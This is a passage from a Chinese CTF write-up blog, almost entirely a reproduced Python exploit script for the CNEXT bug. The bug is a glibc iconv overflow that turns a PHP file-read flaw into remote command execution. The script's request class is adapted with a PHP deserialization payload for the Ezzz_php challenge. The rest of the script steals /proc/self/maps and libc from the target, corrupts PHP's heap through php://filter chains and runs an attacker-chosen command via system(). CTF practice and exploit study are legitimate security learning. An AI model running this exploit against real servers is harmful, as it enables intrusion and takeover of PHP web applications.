class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure></p>
+<pre><code>Tweak it to fit your target, and start the exploit.
+&quot;&quot;&quot;
+
+def __init__(self, url: str) -&gt; None:
+    self.url = url
+    self.session = Session()
+
+def send(self, path: str) -&gt; Response:
+    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
+    &quot;&quot;&quot;
+    payload_file = &#39;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#39; + str(len(path)) + &#39;:&quot;&#39; + path + &#39;&quot;;&#125;&#39;
+    payload = &quot;%9f&quot; * (len(payload_file) + 1) + payload_file.replace(&quot;+&quot;,&quot;%2b&quot;)
+    filename_len = &quot;a&quot; * (len(path) + 10)
+    url = self.url+f&quot;?start=&#123;filename_len&#125;&amp;read=&#123;payload&#125;&quot;
+    return self.session.get(url)
+
+def download(self, path: str) -&gt; bytes:
+    &quot;&quot;&quot;Returns the contents of a remote file.
+    &quot;&quot;&quot;
+    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
+    response = self.send(path)
+    data = response.re.search(b&quot;What you are reading is:(.*)&quot;, flags=re.S).group(1)
+    return base64.decode(data)
+</code></pre><p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
+<pre><code>url: str
+command: str
+sleep: int = 1
+heap: str = None
+pad: int = 20
+
+def __post_init__(self):
+    self.remote = Remote(self.url)
+    self.log = logger(&quot;EXPLOIT&quot;)
+    self.info = &#123;&#125;
+    self.heap = self.heap and int(self.heap, 16)
+
+def check_vulnerable(self) -&gt; None:
+    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
+    wrappers and filters that the exploit needs.
+    &quot;&quot;&quot;
+
+    def safe_download(path: str) -&gt; bytes:
+        try:
+            return self.remote.download(path)
+        except ConnectionError:
+            failure(&quot;Target not [b]reachable[/] ?&quot;)
+
+    def check_token(text: str, path: str) -&gt; bool:
+        result = safe_download(path)
+        return text.encode() == result
+
+    text = tf.random.string(50).encode()
+    base64 = b64(text, misalign=True).decode()
+    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;
+
+    result = safe_download(path)
+
+    if text not in result:
+        msg_failure(&quot;Remote.download did not return the test string&quot;)
+        print(&quot;--------------------&quot;)
+        print(f&quot;Expected test string: &#123;text&#125;&quot;)
+        print(f&quot;Got: &#123;result&#125;&quot;)
+        print(&quot;--------------------&quot;)
+        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]data://[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(text.encode(), misalign=True).decode()
+    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
+    if not check_token(text, path):
+        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)
+
+    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)
+
+    text = tf.random.string(50)
+    base64 = b64(compress(text.encode()), misalign=True).decode()
+    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;
+
+    if not check_token(text, path):
+        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)
+
+    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)
+
+    msg_success(&quot;Exploit preconditions are satisfied&quot;)
+
+def get_file(self, path: str) -&gt; bytes:
+    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
+        return self.remote.download(path)
+
+def get_regions(self) -&gt; list[Region]:
+    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
+    maps = self.get_file(&quot;/proc/self/maps&quot;)
+    maps = maps.decode()
+    PATTERN = re.compile(
+        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
+    )
+    regions = []
+    for region in table.split(maps, strip=True):
+        if match := PATTERN.match(region):
+            start = int(match.group(1), 16)
+            stop = int(match.group(2), 16)
+            permissions = match.group(3)
+            path = match.group(4)
+            if &quot;/&quot; in path or &quot;[&quot; in path:
+                path = path.rsplit(&quot; &quot;, 1)[-1]
+            else:
+                path = &quot;&quot;
+            current = Region(start, stop, permissions, path)
+            regions.append(current)
+        else:
+            print(maps)
+            failure(&quot;Unable to parse memory mappings&quot;)
+
+    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)
+
+    return regions
+
+def get_symbols_and_addresses(self) -&gt; None:
+    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
+    regions = self.get_regions()
+
+    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;
+
+    # PHP&#39;s heap
+
+    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)
+
+    # Libc
+
+    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)
+
+    self.download_file(libc.path, LIBC_FILE)
+
+    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
+    self.info[&quot;libc&quot;].address = libc.start
+
+def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
+    for region in regions:
+        if any(name in region.path for name in names):
+            break
+    else:
+        failure(&quot;Unable to locate region&quot;)
+
+    return region
+
+def download_file(self, remote_path: str, local_path: str) -&gt; None:
+    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
+    data = self.get_file(remote_path)
+    Path(local_path).write(data)
+
+def find_main_heap(self, regions: list[Region]) -&gt; Region:
+    # Any anonymous RW region with a size superior to the base heap size is a
+    # candidate. The heap is at the bottom of the region.
+    heaps = [
+        region.stop - HEAP_SIZE + 0x40
+        for region in reversed(regions)
+        if region.permissions == &quot;rw-p&quot;
+        and region.size &gt;= HEAP_SIZE
+        and region.stop &amp; (HEAP_SIZE - 1) == 0
+        and region.path == &quot;&quot;
+    ]
+
+    if not heaps:
+        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)
+
+    first = heaps[0]
+
+    if len(heaps) &gt; 1:
+        heaps = &quot;, &quot;.join(map(hex, heaps))
+        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
+    else:
+        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)
+
+    return first
+
+def run(self) -&gt; None:
+    self.check_vulnerable()
+    self.get_symbols_and_addresses()
+    self.exploit()
+
+def build_exploit_path(self) -&gt; str:
+    &quot;&quot;&quot;
+
+    On each step of the exploit, a filter will process each chunk one after the
+    other. Processing generally involves making some kind of operation either
+    on the chunk or in a destination chunk of the same size. Each operation is
+    applied on every single chunk; you cannot make PHP apply iconv on the first 10
+    chunks and leave the rest in place. That&#39;s where the difficulties come from.
+
+    Keep in mind that we know the address of the main heap, and the libraries.
+    ASLR/PIE do not matter here.
+
+    The idea is to use the bug to make the freelist for chunks of size 0x100 point
+    lower. For instance, we have the following free list:
+
+    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00
+
+    By triggering the bug from chunk ..900, we get:
+
+    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???
+
+    That&#39;s step 3.
+
+    Now, in order to control the free list, and make it point whereever we want,
+    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
+    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
+    That&#39;s step 2.
+
+    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
+    a problem: after step2 has been processed, the free list goes bottom-up, like:
+
+    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900
+
+    We need to go the other way around. That&#39;s why we have step 1: it just allocates
+    chunks. When they get freed, they reverse the free list. Now step2 allocates in
+    reverse order, and therefore after step2, chunks are in the correct order.
+
+    Another problem comes up.
+
+    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
+    Since step2 creates chunks that contain pointers and pointers are generally not
+    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
+    To avoid this, we put the chunks in step2 at the very end of the chain, and
+    prefix them with `0\n`. When dechunked (right before the iconv), they will
+    &quot;disappear&quot; from the chain, preserving them from the character set conversion
+    and saving us from an unwanted processing error that would stop the processing
+    chain.
+
+    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
+    don&#39;t know the precise layout of the heap, but we know that at the top of the
+    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
+    Its free_slot[] array contains a pointer to each free list. By overwriting it,
+    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
+    field contains pointers to hook functions for emalloc, efree, and erealloc
+    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
+    then overwrite the use_custom_heap flag to make PHP use these function pointers
+    instead. We can now do our favorite CTF technique and get a call to
+    system(&lt;chunk&gt;).
+    We make sure that the &quot;system&quot; command kills the current process to avoid other
+    system() calls with random chunk data, leading to undefined behaviour.
+
+    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
+    process is in a random state, we still get contiguous, in order chunks for our
+    exploit.
+
+    Therefore, the whole process described here CANNOT crash. Everything falls
+    perfectly in place, and nothing can get in the middle of our allocations.
+    &quot;&quot;&quot;
+
+    LIBC = self.info[&quot;libc&quot;]
+    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
+    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
+    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]
+
+    ADDR_HEAP = self.info[&quot;heap&quot;]
+    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+
+    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+
+    CS = 0x100
+
+    # Pad needs to stay at size 0x100 at every step
+    pad_size = CS - 0x18
+    pad = b&quot;\x00&quot; * pad_size
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = compressed_bucket(pad)
+
+    step1_size = 1
+    step1 = b&quot;\x00&quot; * step1_size
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1, CS)
+    step1 = compressed_bucket(step1)
+
+    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
+    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;
+
+    step2_size = 0x48
+    step2 = b&quot;\x00&quot; * (step2_size + 8)
+    step2 = chunked_chunk(step2, CS)
+    step2 = chunked_chunk(step2)
+    step2 = compressed_bucket(step2)
+
+    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
+    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+    step2_write_ptr = chunked_chunk(step2_write_ptr)
+    step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+    step3_size = CS
+
+    step3 = b&quot;\x00&quot; * step3_size
+    assert len(step3) == CS
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = compressed_bucket(step3)
+
+    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
+    assert len(step3_overflow) == CS
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = compressed_bucket(step3_overflow)
+
+    step4_size = CS
+    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = compressed_bucket(step4)
+
+    # This chunk will eventually overwrite mm_heap-&gt;free_slot
+    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
+    step4_pwn = ptr_bucket(
+        0x200000,
+        0,
+        # free_slot
+        0,
+        0,
+        ADDR_CUSTOM_HEAP,  # 0x18
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        ADDR_HEAP,  # 0x140
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        size=CS,
+    )
+
+    step4_custom_heap = ptr_bucket(
+        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+    )
+
+    step4_use_custom_heap_size = 0x140
+
+    COMMAND = self.command
+    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
+    if self.sleep:
+        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
+    COMMAND = COMMAND.encode() + b&quot;\x00&quot;
+
+    assert (
+            len(COMMAND) &lt;= step4_use_custom_heap_size
+    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
+    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)
+
+    step4_use_custom_heap = COMMAND
+    step4_use_custom_heap = qpe(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+
+    pages = (
+            step4 * 3
+            + step4_pwn
+            + step4_custom_heap
+            + step4_use_custom_heap
+            + step3_overflow
+            + pad * self.pad
+            + step1 * 3
+            + step2_write_ptr
+            + step2 * 2
+    )
+
+    resource = compress(compress(pages))
+    resource = b64(resource)
+    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;
+
+    filters = [
+        # Create buckets
+        &quot;zlib.inflate&quot;,
+        &quot;zlib.inflate&quot;,
+
+        # Step 0: Setup heap
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 1: Reverse FL order
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 2: Put fake pointer and make FL order back to normal
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+
+        # Step 3: Trigger overflow
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
+
+        # Step 4: Allocate at arbitrary address and change zend_mm_heap
+        &quot;convert.quoted-printable-decode&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+    ]
+    filters = &quot;|&quot;.join(filters)
+    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;
+
+    return path
+
+@inform(&quot;Triggering...&quot;)
+def exploit(self) -&gt; None:
+    path = self.build_exploit_path()
+    start = time.time()
+
+    try:
+        self.remote.send(path)
+    except (ConnectionError, ChunkedEncodingError):
+        pass
+
+    msg_print()
+
+    if not self.sleep:
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
+    elif start + self.sleep &lt;= time.time():
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
+    else:
+        # Wrong heap, maybe? If the exploited suggested others, use them!
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
+
+    msg_print()
+</code></pre><p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””</p>
+<pre><code># Remove 2-byte header and 4-byte checksum
+return zlib.compress(data, 9)[2:-4]
+</code></pre><p>def b64(data: bytes, misalign=True) -&gt; bytes:<br>    payload = base64.encode(data)<br>    if not misalign and payload.endswith(“=”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
+<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
+<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”={x:02x}” for x in data).upper().encode()</p>
+<p>def ptr_bucket(<em>ptrs, size=None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) </em> 8 == size<br>    bucket = b””.join(map(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)</p>
+<pre><code>return bucket
+</code></pre><p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””</p>
+<pre><code># The caller does not care about the size: let&#39;s just add 8, which is more than
+# enough
+if size is None:
+    size = len(data) + 8
+keep = len(data) + len(b&quot;\n\n&quot;)
+size = f&quot;&#123;len(data):x&#125;&quot;.rjust(size - keep, &quot;0&quot;)
+return size.encode() + b&quot;\n&quot; + data + b&quot;\n&quot;
+</code></pre><p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
+<pre><code>start: int
+stop: int
+permissions: str
+path: str
+
+@property
+def size(self) -&gt; int:
+    return self.stop - self.start
+</code></pre><p>Exploit()<br>```<br>#</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lisien11.github.io">L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lisien11.github.io/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/">https://lisien11.github.io/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lisien11.github.io" target="_blank">L的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover7.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/14/java%E5%8F%8D%E5%B0%84/" title="java反射"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover17.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java反射</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/30/checklist/" title="checklist"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover17.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">checklist</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/" title="CISCN2024线下赛后感"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover10.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-24</div><div class="title">CISCN2024线下赛后感</div></div></a></div><div><a href="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="CISCN2024初赛复现"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-20</div><div class="title">CISCN2024初赛复现</div></div></a></div><div><a href="/2023/11/28/ISCTF%E7%9A%84wp/" title="ISCTF的wp"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F202004%2F11%2F20200411215343_saytu.thumb.1000_0.jpg&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1701221309&t=d8ef7f5e54d9d232203a7bb20176846f" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">ISCTF的wp</div></div></a></div><div><a href="/2024/04/06/FCTF%E7%9A%84wp/" title="FCTF的wp"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover15.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-06</div><div class="title">FCTF的wp</div></div></a></div><div><a href="/2023/11/08/NSSCTF-LitCTF%E5%85%A5%E9%97%A8web%E7%9A%84wp/" title="NSSCTF:LitCTF入门web的wp"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover10.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-08</div><div class="title">NSSCTF:LitCTF入门web的wp</div></div></a></div><div><a href="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" title="NKCTF的复现学习"><img class="cover" src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-25</div><div class="title">NKCTF的复现学习</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://th.bing.com/th/id/R.8bda02900fe99b604c62102fa4c75ec9?rik=7tS3LLDyoKGywA&amp;riu=http%3a%2f%2fwww.xinjiadiy.com%2fimages%2farticle_img%2ftuwen%2f20170509%2f4525.jpg&amp;ehk=e1ROYyc3Wlh4n0HejYoZHLpkaEmkdi2lDGwD8WosTP0%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">L</div><div class="author-info__description">我只是一个平平无奇路过的普通大学生罢了</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lisien11" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2488218724@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%91%E5%81%87%E8%BF%98%E6%98%AF%E6%9C%89%E7%82%B9%E7%8A%AF%E6%87%92%E4%BA%86%EF%BC%8C%E5%93%8E%E6%84%8F%E6%96%99%E4%B9%8B%E4%B8%AD%EF%BC%8C%E4%B8%8A%E5%91%A8ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AF%E7%9A%84%E9%A2%98%E7%9B%AE%E6%88%91%E7%9C%8B%E4%BA%86%E4%B8%80%E4%BA%9B%EF%BC%8C%E6%84%9F%E8%A7%89%E8%BF%98%E6%98%AF%E5%BE%88%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E6%89%80%E6%9C%89%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CodeInject"><span class="toc-number">2.</span> <span class="toc-text">CodeInject</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-polluted"><span class="toc-number">3.</span> <span class="toc-text">easy_polluted</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ezzz-php"><span class="toc-number">4.</span> <span class="toc-text">Ezzz_php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text">反序列链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">4.1.1.</span> <span class="toc-text">一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">4.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 